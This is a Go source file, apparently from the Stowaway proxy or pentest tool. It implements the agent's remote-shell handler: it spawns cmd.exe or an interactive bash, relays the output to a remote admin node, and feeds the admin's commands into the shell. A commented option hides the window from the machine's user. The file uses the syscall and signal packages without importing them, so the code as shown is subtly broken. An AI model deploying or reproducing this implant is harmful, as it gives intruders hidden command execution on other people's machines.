package handler

import (
	"io"
	"os/exec"
	"runtime"

	"Stowaway/agent/manager"
	"Stowaway/global"
	"Stowaway/protocol"
	"Stowaway/utils"
)

type Shell struct {
	stdin  io.Writer
	stdout io.Reader
}

func newShell() *Shell {
	return new(Shell)
}

func (shell *Shell) start() {
	var cmd *exec.Cmd
	var err error

	sMessage := protocol.PrepareAndDecideWhichSProtoToUpper(global.G_Component.Conn, global.G_Component.Secret, global.G_Component.UUID)

	shellResHeader := &protocol.Header{
		Sender:      global.G_Component.UUID,
		Accepter:    protocol.ADMIN_UUID,
		MessageType: protocol.SHELLRES,
		RouteLen:    uint32(len([]byte(protocol.TEMP_ROUTE))), // No need to set route when agent send mess to admin
		Route:       protocol.TEMP_ROUTE,
	}

	shellResultHeader := &protocol.Header{
		Sender:      global.G_Component.UUID,
		Accepter:    protocol.ADMIN_UUID,
		MessageType: protocol.SHELLRESULT,
		RouteLen:    uint32(len([]byte(protocol.TEMP_ROUTE))), // No need to set route when agent send mess to admin
		Route:       protocol.TEMP_ROUTE,
	}

	shellResFailMess := &protocol.ShellRes{
		OK: 0,
	}

	shellResSuccMess := &protocol.ShellRes{
		OK: 1,
	}

	defer func() {
		if err != nil {
			protocol.ConstructMessage(sMessage, shellResHeader, shellResFailMess, false)
			sMessage.SendMessage()
		}
	}()

	switch utils.CheckSystem() {
	case 0x01:
		cmd = exec.Command("c:\\windows\\system32\\cmd.exe")
		// cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true} // If you don't want the cmd window, remove "//"
	default:
		cmd = exec.Command("/bin/sh", "-i")
		if runtime.GOARCH == "386" || runtime.GOARCH == "amd64" {
			cmd = exec.Command("/bin/bash", "-i")
		}
		cmd.SysProcAttr = &syscall.SysProcAttr{Foreground: true}
		signal.Ignore(syscall.SIGTTIN, syscall.SIGTTOU)
	}

	shell.stdout, err = cmd.StdoutPipe()
	if err != nil {
		return
	}

	shell.stdin, err = cmd.StdinPipe()
	if err != nil {
		return
	}

	cmd.Stderr = cmd.Stdout //将stderr重定向至stdout

	err = cmd.Start()
	if err != nil {
		return
	}

	protocol.ConstructMessage(sMessage, shellResHeader, shellResSuccMess, false)
	sMessage.SendMessage()

	shellExitHeader := &protocol.Header{
		Sender:      global.G_Component.UUID,
		Accepter:    protocol.ADMIN_UUID,
		MessageType: protocol.SHELLEXIT,
		RouteLen:    uint32(len([]byte(protocol.TEMP_ROUTE))), // No need to set route when agent send mess to admin
		Route:       protocol.TEMP_ROUTE,
	}

	shellExitMess := &protocol.ShellExit{
		OK: 1,
	}

	buffer := make([]byte, 4096)
	for {
		count, err := shell.stdout.Read(buffer)

		if err != nil {
			protocol.ConstructMessage(sMessage, shellExitHeader, shellExitMess, false)
			sMessage.SendMessage()
			return
		}

		shellResultMess := &protocol.ShellResult{
			ResultLen: uint64(count),
			Result:    string(buffer[:count]),
		}

		protocol.ConstructMessage(sMessage, shellResultHeader, shellResultMess, false)
		sMessage.SendMessage()
	}
}

func (shell *Shell) input(command string) {
	shell.stdin.Write([]byte(command))
}

func DispatchShellMess(mgr *manager.Manager) {
	shell := newShell()

	for {
		message := <-mgr.ShellManager.ShellMessChan

		switch message.(type) {
		case *protocol.ShellReq:
			go shell.start()
		case *protocol.ShellCommand:
			mess := message.(*protocol.ShellCommand)
			shell.input(mess.Command)
		}
	}
}
